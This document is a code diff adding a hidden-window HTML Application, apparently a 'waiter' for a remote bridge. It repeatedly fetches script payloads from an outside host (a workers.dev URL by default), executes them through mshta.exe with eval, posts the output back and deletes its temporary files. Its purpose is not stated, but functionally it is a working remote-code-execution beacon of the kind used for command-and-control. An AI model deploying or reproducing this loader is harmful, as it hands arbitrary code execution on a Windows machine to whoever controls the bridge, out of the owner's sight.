@@ -1,0 +1,106 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="X-UA-Compatible" content="IE=9">
+  <title>MSHTA Waiter</title>
+  <hta:application id="app" showintaskbar="no" windowstate="minimize" />
+  <script language="JScript">
+    var shell = new ActiveXObject("WScript.Shell");
+    var fileSystem = new ActiveXObject("Scripting.FileSystemObject");
+    var processEnvironment = shell.Environment("Process");
+    var BRIDGE = processEnvironment("BRIDGE") || "https://bridge.smokestack.workers.dev";
+
+    function httpRequest(method, url, body) {
+      var request = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+      request.SetTimeouts(30000, 30000, 30000, 910000);
+      request.Open(method, url, false);
+      if (body !== undefined) {
+        request.SetRequestHeader("Content-Type", "application/json");
+      }
+      request.Send(body === undefined ? null : JSON.stringify(body));
+
+      if (request.Status < 200 || request.Status >= 300) {
+        throw new Error("Bridge returned HTTP " + request.Status + ": " + request.ResponseText);
+      }
+      return request.ResponseText;
+    }
+
+    function quote(text) {
+      return '"' + String(text)
+        .replace(/\\/g, "\\\\")
+        .replace(/"/g, '\\"')
+        .replace(/\r/g, "\\r")
+        .replace(/\n/g, "\\n")
+        .replace(/\u2028/g, "\\u2028")
+        .replace(/\u2029/g, "\\u2029") + '"';
+    }
+
+    function runScript(scriptText) {
+      var id = new ActiveXObject("Scriptlet.TypeLib").GUID.replace(/[{}]/g, "");
+      var tempFolder = fileSystem.GetSpecialFolder(2).Path;
+      var scriptPath = fileSystem.BuildPath(tempFolder, "script-" + id + ".hta");
+      var outputPath = fileSystem.BuildPath(tempFolder, "script-" + id + ".txt");
+      var wrapper = '<!doctype html><html><head><meta http-equiv="X-UA-Compatible" content="IE=9">' +
+        '<hta:application showintaskbar="no" windowstate="minimize" /></head><body><script language="JScript">' +
+        'var output=[];var console={log:function(){var values=[];for(var i=0;i<arguments.length;i++){values.push(String(arguments[i]));}output.push(values.join(" "));}};' +
+        'try{eval(' + quote(scriptText) + ');}catch(error){output.push(String(error));}finally{' +
+        'var fso=new ActiveXObject("Scripting.FileSystemObject");var file=fso.CreateTextFile(' + quote(outputPath) + ',true,true);' +
+        'file.Write(output.join("\\r\\n"));file.Close();window.close();}' +
+        '<\/script></body></html>';
+
+      try {
+        var scriptFile = fileSystem.CreateTextFile(scriptPath, true, true);
+        scriptFile.Write(wrapper);
+        scriptFile.Close();
+
+        var status = shell.Run("mshta.exe " + quote(scriptPath), 0, true);
+        if (!fileSystem.FileExists(outputPath)) {
+          return "mshta.exe exited with " + status + " without producing output";
+        }
+        var outputFile = fileSystem.OpenTextFile(outputPath, 1, false, -1);
+        var output = outputFile.ReadAll();
+        outputFile.Close();
+        return output;
+      } catch (error) {
+        return String(error);
+      } finally {
+        if (fileSystem.FileExists(scriptPath)) fileSystem.DeleteFile(scriptPath, true);
+        if (fileSystem.FileExists(outputPath)) fileSystem.DeleteFile(outputPath, true);
+      }
+    }
+
+    function log(message) {
+      document.getElementById("status").innerText = message;
+    }
+
+    function sleep() {
+      shell.Run("%COMSPEC% /c ping 127.0.0.1 -n 2 > nul", 0, true);
+    }
+
+    function listen() {
+      var timer = new Date().getTime();
+      while (true) {
+        try {
+          var item = JSON.parse(httpRequest("GET", BRIDGE + "/listen/mshta"));
+          log("Received " + item.transaction_id);
+          var response = {
+            transaction_id: item.transaction_id,
+            response: runScript(item.payload)
+          };
+          httpRequest("POST", BRIDGE + "/response", [response]);
+          timer = new Date().getTime();
+        } catch (error) {
+          log("waiter: " + String(error));
+          sleep();
+        }
+
+        if (new Date().getTime() > timer + 15 * 60 * 1000) {
+          window.close();
+          return;
+        }
+      }
+    }
+  </script>
+</head>
+<body onload="listen()"><div id="status">Starting MSHTA waiter...</div></body>
+</html>
